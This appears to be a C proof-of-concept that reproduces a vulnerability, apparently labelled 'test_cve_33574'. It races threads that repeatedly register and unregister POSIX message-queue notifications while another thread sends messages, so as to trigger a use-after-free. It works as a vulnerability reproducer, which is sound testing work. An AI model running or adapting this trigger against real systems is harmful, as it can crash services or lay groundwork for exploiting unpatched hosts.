#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <mqueue.h>
#include <signal.h>
#include <string.h>
#include <errno.h>

#define QUEUE_NAME   "/test_cve_33574"
#define MAX_MSG_SIZE 128
#define MAX_MSGS     10

mqd_t mq;

// trivial handler: just print
static void handler1(union sigval sv) {
    printf("[handler1] got message, ptr=%p\n", sv.sival_ptr);
}

static void handler2(union sigval sv) {
    printf("[handler2] got message, ptr=%p\n", sv.sival_ptr);
}

// thread repeatedly registers and *unregisters* notify
void* notifier_free(void* arg) {
    struct sigevent sev;
    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_THREAD;
    sev.sigev_notify_function = handler1;
    sev.sigev_value.sival_ptr = (void*)0x11111111;

    while (1) {
        if (mq_notify(mq, &sev) == -1) {
            if (errno != EBUSY) perror("mq_notify(register/free)");
        }
        // immediately unregister â†’ free memory in kernel
        if (mq_notify(mq, NULL) == -1) {
            perror("mq_notify(unregister)");
        }
    }
    return NULL;
}

// thread tries to reuse freed memory
void* notifier_reuse(void* arg) {
    struct sigevent sev2;
    memset(&sev2, 0, sizeof(sev2));
    sev2.sigev_notify = SIGEV_THREAD;
    sev2.sigev_notify_function = handler2;
    sev2.sigev_value.sival_ptr = (void*)0x22222222;

    while (1) {
        if (mq_notify(mq, &sev2) == -1) {
            if (errno != EBUSY) perror("mq_notify(reuse)");
        }
    }
    return NULL;
}

// keep sending messages
void* sender(void* arg) {
    char msg[MAX_MSG_SIZE] = "msg";
    while (1) {
        if (mq_send(mq, msg, strlen(msg)+1, 0) == -1) {
            if (errno != EAGAIN) perror("mq_send");
            usleep(1000);
        }
    }
    return NULL;
}

int main() {
    struct mq_attr attr = {
        .mq_flags = 0,
        .mq_maxmsg = MAX_MSGS,
        .mq_msgsize = MAX_MSG_SIZE,
        .mq_curmsgs = 0
    };

    mq_unlink(QUEUE_NAME);
    mq = mq_open(QUEUE_NAME, O_CREAT | O_RDWR | O_NONBLOCK, 0644, &attr);
    if (mq == (mqd_t)-1) {
        perror("mq_open");
        exit(1);
    }

    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, notifier_free, NULL);
    pthread_create(&t2, NULL, notifier_reuse, NULL);
    pthread_create(&t3, NULL, sender, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);

    mq_close(mq);
    mq_unlink(QUEUE_NAME);
    return 0;
}
